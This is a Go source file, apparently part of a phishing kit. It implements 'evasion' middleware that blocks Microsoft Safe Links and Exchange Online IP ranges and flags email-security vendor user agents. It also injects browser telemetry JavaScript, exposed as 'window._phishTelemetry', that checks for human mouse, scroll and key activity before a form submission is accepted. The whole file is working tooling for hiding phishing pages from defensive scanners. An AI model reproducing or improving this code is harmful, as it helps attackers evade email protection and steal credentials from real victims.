package evasion

import (
	"encoding/json"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

type BehavioralConfig struct {
	Enabled              bool     `json:"enabled"`
	MinTimeOnPage        int      `json:"min_time_on_page_ms"`
	RequireMouseMovement bool     `json:"require_mouse_movement"`
	RequireInteraction   bool     `json:"require_interaction"`
	BlockMicrosoftIPs    bool     `json:"block_microsoft_ips"`
	CustomBlockedCIDRs   []string `json:"custom_blocked_cidrs"`
	MaxRequestsPerMinute int      `json:"max_requests_per_minute"`
}

type TelemetryData struct {
	TimeOnPage       int64   `json:"time_on_page_ms"`
	MouseMoves       int     `json:"mouse_moves"`
	MouseClicks      int     `json:"mouse_clicks"`
	ScrollEvents     int     `json:"scroll_events"`
	KeyPresses       int     `json:"key_presses"`
	TouchEvents      int     `json:"touch_events"`
	PageLoadTime     int64   `json:"page_load_time"`
	SubmitTime       int64   `json:"submit_time"`
	ScreenWidth      int     `json:"screen_width"`
	ScreenHeight     int     `json:"screen_height"`
	HasWebGL         bool    `json:"has_webgl"`
	HasTouch         bool    `json:"has_touch"`
	DevicePixelRatio float64 `json:"device_pixel_ratio"`
}

type BehavioralMiddleware struct {
	config        *BehavioralConfig
	blockedCIDRs  []*net.IPNet
	requestCounts map[string]*rateLimitEntry
	mu            sync.RWMutex
}

type rateLimitEntry struct {
	count     int
	resetTime time.Time
}

// Microsoft 365 / Exchange Online Protection / Safe Links IP ranges
// Source: https://endpoints.office.com/endpoints/worldwide (updated 2026-01)
// These ranges are used by Microsoft Defender for Office 365 Safe Links scanning
var microsoftSafeLinksCIDRs = []string{
	// Exchange Online Protection (EOP) - Primary Safe Links scanning infrastructure
	"40.92.0.0/15",
	"40.107.0.0/16",
	"52.100.0.0/14",
	"52.238.78.88/32",
	"104.47.0.0/17",

	// Exchange Online - Outlook services
	"13.107.6.152/31",
	"13.107.18.10/31",
	"13.107.128.0/22",
	"23.103.160.0/20",
	"40.96.0.0/13",
	"40.104.0.0/15",
	"52.96.0.0/14",
	"131.253.33.215/32",
	"132.245.0.0/16",
	"150.171.32.0/22",
	"204.79.197.215/32",

	// Microsoft 365 Common / Security services
	"13.107.6.192/32",
	"13.107.9.192/32",
	"20.20.32.0/19",
	"20.190.128.0/18",
	"20.231.128.0/19",
	"40.126.0.0/18",

	// Microsoft 365 Office Apps
	"13.107.6.171/32",
	"13.107.18.15/32",
	"13.107.140.6/32",
	"52.108.0.0/14",
	"52.244.37.168/32",

	// SharePoint Online (often accessed during link scanning)
	"13.107.136.0/22",
	"40.108.128.0/17",
	"52.104.0.0/14",
	"104.146.128.0/17",
	"150.171.40.0/22",

	// Microsoft Teams (integrated with Defender)
	"52.112.0.0/14",
	"52.122.0.0/15",

	// Azure AD (authentication during scanning)
	"20.190.128.0/18",
	"40.126.0.0/18",
}

func NewBehavioralMiddleware(config *BehavioralConfig) *BehavioralMiddleware {
	bm := &BehavioralMiddleware{
		config:        config,
		blockedCIDRs:  make([]*net.IPNet, 0),
		requestCounts: make(map[string]*rateLimitEntry),
	}

	if config.BlockMicrosoftIPs {
		for _, cidr := range microsoftSafeLinksCIDRs {
			_, ipNet, err := net.ParseCIDR(cidr)
			if err == nil {
				bm.blockedCIDRs = append(bm.blockedCIDRs, ipNet)
			}
		}
	}

	for _, cidr := range config.CustomBlockedCIDRs {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err == nil {
			bm.blockedCIDRs = append(bm.blockedCIDRs, ipNet)
		}
	}

	go bm.cleanupRateLimits()

	return bm
}

func (bm *BehavioralMiddleware) IsEnabled() bool {
	return bm.config != nil && bm.config.Enabled
}

func (bm *BehavioralMiddleware) IsBlockedIP(ipStr string) bool {
	if !bm.IsEnabled() {
		return false
	}

	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}

	for _, cidr := range bm.blockedCIDRs {
		if cidr.Contains(ip) {
			return true
		}
	}

	return false
}

func (bm *BehavioralMiddleware) CheckRateLimit(ipStr string) bool {
	if !bm.IsEnabled() || bm.config.MaxRequestsPerMinute <= 0 {
		return false
	}

	bm.mu.Lock()
	defer bm.mu.Unlock()

	now := time.Now()
	entry, exists := bm.requestCounts[ipStr]

	if !exists || now.After(entry.resetTime) {
		bm.requestCounts[ipStr] = &rateLimitEntry{
			count:     1,
			resetTime: now.Add(time.Minute),
		}
		return false
	}

	entry.count++
	return entry.count > bm.config.MaxRequestsPerMinute
}

func (bm *BehavioralMiddleware) ValidateTelemetry(data *TelemetryData) (bool, string) {
	if !bm.IsEnabled() {
		return true, ""
	}

	if bm.config.MinTimeOnPage > 0 && data.TimeOnPage < int64(bm.config.MinTimeOnPage) {
		return false, "insufficient_time"
	}

	if bm.config.RequireMouseMovement && data.MouseMoves == 0 && data.TouchEvents == 0 {
		return false, "no_mouse_movement"
	}

	if bm.config.RequireInteraction {
		totalInteractions := data.ScrollEvents + data.MouseClicks + data.KeyPresses + data.TouchEvents
		if totalInteractions == 0 {
			return false, "no_interaction"
		}
	}

	return true, ""
}

func (bm *BehavioralMiddleware) ParseTelemetry(r *http.Request) (*TelemetryData, error) {
	telemetryStr := r.FormValue("_telemetry")
	if telemetryStr == "" {
		return nil, nil
	}

	var data TelemetryData
	if err := json.Unmarshal([]byte(telemetryStr), &data); err != nil {
		return nil, err
	}

	return &data, nil
}

func (bm *BehavioralMiddleware) GetBlockReason(r *http.Request) string {
	if !bm.IsEnabled() {
		return ""
	}

	clientIP := getClientIP(r)

	if bm.IsBlockedIP(clientIP) {
		return "blocked_ip_range"
	}

	if bm.CheckRateLimit(clientIP) {
		return "rate_limited"
	}

	return ""
}

func (bm *BehavioralMiddleware) ShouldBlock(r *http.Request) (bool, string) {
	if !bm.IsEnabled() {
		return false, ""
	}

	if reason := bm.GetBlockReason(r); reason != "" {
		return true, reason
	}

	if r.Method == http.MethodPost {
		telemetry, err := bm.ParseTelemetry(r)
		if err != nil {
			return true, "invalid_telemetry"
		}
		if telemetry != nil {
			valid, reason := bm.ValidateTelemetry(telemetry)
			if !valid {
				return true, reason
			}
		}
	}

	return false, ""
}

func (bm *BehavioralMiddleware) cleanupRateLimits() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		bm.mu.Lock()
		now := time.Now()
		for ip, entry := range bm.requestCounts {
			if now.After(entry.resetTime) {
				delete(bm.requestCounts, ip)
			}
		}
		bm.mu.Unlock()
	}
}

func IsSuspiciousUserAgent(ua string) bool {
	ua = strings.ToLower(ua)

	suspiciousPatterns := []string{
		"safelinks",
		"protection.outlook",
		"defender",
		"atp",
		"mimecast",
		"proofpoint",
		"barracuda",
		"fireeye",
		"fortimail",
		"messagelabs",
		"symantec",
		"sophos",
		"cloudmark",
		"spamhaus",
		"mailguard",
		"urldefense",
		"trendmicro",
		"mcafee",
		"kaspersky",
		"websense",
	}

	for _, pattern := range suspiciousPatterns {
		if strings.Contains(ua, pattern) {
			return true
		}
	}

	return false
}

func GetTelemetryJS() string {
	return `<script>
(function() {
    var t = {
        time_on_page_ms: 0,
        mouse_moves: 0,
        mouse_clicks: 0,
        scroll_events: 0,
        key_presses: 0,
        touch_events: 0,
        page_load_time: Date.now(),
        submit_time: 0,
        screen_width: window.screen.width,
        screen_height: window.screen.height,
        has_webgl: false,
        has_touch: 'ontouchstart' in window,
        device_pixel_ratio: window.devicePixelRatio || 1
    };
    try {
        var c = document.createElement('canvas');
        t.has_webgl = !!(c.getContext('webgl') || c.getContext('experimental-webgl'));
    } catch(e) {}
    var lm = 0;
    document.addEventListener('mousemove', function() {
        var n = Date.now();
        if (n - lm > 50) { t.mouse_moves++; lm = n; }
    }, {passive: true});
    document.addEventListener('click', function() { t.mouse_clicks++; }, {passive: true});
    var ls = 0;
    document.addEventListener('scroll', function() {
        var n = Date.now();
        if (n - ls > 100) { t.scroll_events++; ls = n; }
    }, {passive: true});
    document.addEventListener('keydown', function() { t.key_presses++; }, {passive: true});
    document.addEventListener('touchstart', function() { t.touch_events++; }, {passive: true});
    document.addEventListener('submit', function(e) {
        t.submit_time = Date.now();
        t.time_on_page_ms = t.submit_time - t.page_load_time;
        var f = e.target;
        var i = f.querySelector('input[name="_telemetry"]');
        if (!i) {
            i = document.createElement('input');
            i.type = 'hidden';
            i.name = '_telemetry';
            f.appendChild(i);
        }
        i.value = JSON.stringify(t);
    }, true);
    window._phishTelemetry = t;
})();
</script>`
}
